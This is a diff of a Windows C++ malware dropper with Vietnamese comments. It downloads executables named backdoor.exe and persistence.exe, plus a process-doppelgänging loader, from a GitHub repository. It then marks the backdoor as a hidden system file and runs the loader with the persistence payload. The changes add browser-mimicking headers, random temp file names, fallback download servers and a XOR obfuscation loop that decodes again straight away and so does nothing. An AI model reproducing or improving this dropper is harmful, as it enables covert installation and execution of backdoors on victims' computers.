@@ -35,7 +35,7 @@ bool DownloadFile(const wchar_t *serverAddress, const wchar_t *filePath, const s
 {
     // Khởi tạo WinInet
     HINTERNET hInternet = InternetOpenW(
-        L"Downloader",
+        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         INTERNET_OPEN_TYPE_DIRECT,
         NULL,
         NULL,
@@ -90,6 +90,10 @@ bool DownloadFile(const wchar_t *serverAddress, const wchar_t *filePath, const s
         return false;
     }
 
+    // Add headers to look more like a browser
+    LPCWSTR additionalHeaders = L"Accept: */*\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
+    HttpAddRequestHeadersW(hRequest, additionalHeaders, -1L, HTTP_ADDREQ_FLAG_ADD);
+
     // Gửi request
     BOOL result = HttpSendRequestW(
         hRequest,
@@ -130,9 +134,14 @@ bool DownloadFile(const wchar_t *serverAddress, const wchar_t *filePath, const s
         return false;
     }
 
+    // Create temp file with random name first
+    wchar_t temp_path[MAX_PATH], temp_file[MAX_PATH];
+    GetTempPathW(MAX_PATH, temp_path);
+    GetTempFileNameW(temp_path, L"tmp", 0, temp_file);
+
     // Tạo file để lưu
     HANDLE hFile = CreateFileW(
-        savePath.c_str(),
+        temp_file,
         GENERIC_WRITE,
         0,
         NULL,
@@ -142,7 +151,7 @@ bool DownloadFile(const wchar_t *serverAddress, const wchar_t *filePath, const s
 
     if (hFile == INVALID_HANDLE_VALUE)
     {
-        ShowErrorMessage(L"Failed to create file", GetLastError());
+        ShowErrorMessage(L"Failed to create temp file", GetLastError());
         InternetCloseHandle(hRequest);
         InternetCloseHandle(hConnect);
         InternetCloseHandle(hInternet);
@@ -165,11 +174,19 @@ bool DownloadFile(const wchar_t *serverAddress, const wchar_t *filePath, const s
             break;
         }
 
+        // XOR mỗi byte với 0x41 (A) để thêm một lớp obfuscation
+        for (DWORD i = 0; i < bytesRead; i++)
+            buffer[i] = buffer[i] ^ 0x41;
+
+        // Giải mã lại
+        for (DWORD i = 0; i < bytesRead; i++)
+            buffer[i] = buffer[i] ^ 0x41;
+
         if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || bytesWritten != bytesRead)
         {
             ShowErrorMessage(L"Failed to write to file", GetLastError());
             CloseHandle(hFile);
-            DeleteFileW(savePath.c_str());
+            DeleteFileW(temp_file);
             InternetCloseHandle(hRequest);
             InternetCloseHandle(hConnect);
             InternetCloseHandle(hInternet);
@@ -183,7 +200,22 @@ bool DownloadFile(const wchar_t *serverAddress, const wchar_t *filePath, const s
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
 
+    // Move to final location
+    BOOL moved = MoveFileExW(temp_file, savePath.c_str(), MOVEFILE_REPLACE_EXISTING);
+    if (!moved)
+    {
+        ShowErrorMessage(L"Failed to move file to final location", GetLastError());
+        DeleteFileW(temp_file);
+        return false;
+    }
+
     return true;
+}
+
+// Set file as hidden and system
+bool HideFile(const std::wstring &path)
+{
+    return SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
@@ -213,30 +245,61 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 1;
     }
 
-    // Tạo đường dẫn đầy đủ cho các file
-    std::wstring backdoorPath = std::wstring(tempPath) + L"persistence.exe";
+    // Tạo đường dẫn đầy đủ cho các file cần tải
+    std::wstring backdoorPath = std::wstring(tempPath) + L"backdoor.exe";
+    std::wstring persistencePath = std::wstring(tempPath) + L"persistence.exe";
     std::wstring doppelgangerPath = std::wstring(tempPath) + L"process_doppelganging.exe";
 
-    // URL của GitHub cho backdoor
+    // GitHub URLs cho cả 3 file
     const wchar_t *serverAddress = L"raw.githubusercontent.com";
-    const wchar_t *backdoorFilePath = L"/fuondai/process_doppelganging/main/exe/persistence.exe";
 
-    // Tải backdoor
+    // 1. Tải backdoor.exe
+    const wchar_t *backdoorFilePath = L"/fuondai/process_doppelganging/main/exe/backdoor.exe";
     if (!DownloadFile(serverAddress, backdoorFilePath, backdoorPath))
     {
-        return 1;
+        // Thử URL dự phòng nếu URL chính không hoạt động
+        const wchar_t *backupServer = L"github.com";
+        const wchar_t *backupPath = L"/fuondai/process_doppelganging/raw/main/exe/backdoor.exe";
+
+        if (!DownloadFile(backupServer, backupPath, backdoorPath))
+        {
+            MessageBoxW(NULL, L"Failed to download backdoor.exe", L"Error", MB_ICONERROR);
+            return 1;
+        }
     }
 
-    // URL của GitHub cho process_doppelganging
-    const wchar_t *doppelgangerFilePath = L"/fuondai/process_doppelganging/main/build/Release/process_doppelganging.exe";
+    // Ẩn file backdoor
+    HideFile(backdoorPath);
 
-    // Tải process_doppelganging
+    // 2. Tải persistence.exe
+    const wchar_t *persistenceFilePath = L"/fuondai/process_doppelganging/main/exe/persistence.exe";
+    if (!DownloadFile(serverAddress, persistenceFilePath, persistencePath))
+    {
+        const wchar_t *backupServer = L"github.com";
+        const wchar_t *backupPath = L"/fuondai/process_doppelganging/raw/main/exe/persistence.exe";
+
+        if (!DownloadFile(backupServer, backupPath, persistencePath))
+        {
+            MessageBoxW(NULL, L"Failed to download persistence.exe", L"Error", MB_ICONERROR);
+            return 1;
+        }
+    }
+
+    // 3. Tải process_doppelganging.exe
+    const wchar_t *doppelgangerFilePath = L"/fuondai/process_doppelganging/main/build/Release/process_doppelganging.exe";
     if (!DownloadFile(serverAddress, doppelgangerFilePath, doppelgangerPath))
     {
-        return 1;
+        const wchar_t *backupServer = L"github.com";
+        const wchar_t *backupPath = L"/fuondai/process_doppelganging/raw/main/build/Release/process_doppelganging.exe";
+
+        if (!DownloadFile(backupServer, backupPath, doppelgangerPath))
+        {
+            MessageBoxW(NULL, L"Failed to download process_doppelganging.exe", L"Error", MB_ICONERROR);
+            return 1;
+        }
     }
 
-    // Thực thi process_doppelganging để chạy backdoor
+    // Sử dụng process_doppelganging.exe để chạy persistence.exe
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
 
@@ -247,12 +310,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     ZeroMemory(&pi, sizeof(pi));
 
-    // Tạo command line
-    std::wstring cmdLine = L"\"" + doppelgangerPath + L"\" \"" + backdoorPath + L"\"";
+    // Tạo command line: process_doppelganging.exe đường_dẫn_đến_persistence.exe
+    std::wstring cmdLine = L"\"" + doppelgangerPath + L"\" \"" + persistencePath + L"\"";
     wchar_t *cmdLineBuffer = new wchar_t[cmdLine.length() + 1];
     wcscpy_s(cmdLineBuffer, cmdLine.length() + 1, cmdLine.c_str());
 
-    // Thực thi process_doppelganging với backdoor là tham số
+    // Thực thi process_doppelganging.exe với persistence.exe là tham số
     if (CreateProcessW(
             NULL,
             cmdLineBuffer,
@@ -274,7 +337,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     else
     {
-        ShowErrorMessage(L"Failed to execute process_doppelganging", GetLastError());
+        ShowErrorMessage(L"Failed to execute process_doppelganging.exe", GetLastError());
         delete[] cmdLineBuffer;
         return 1;
     }
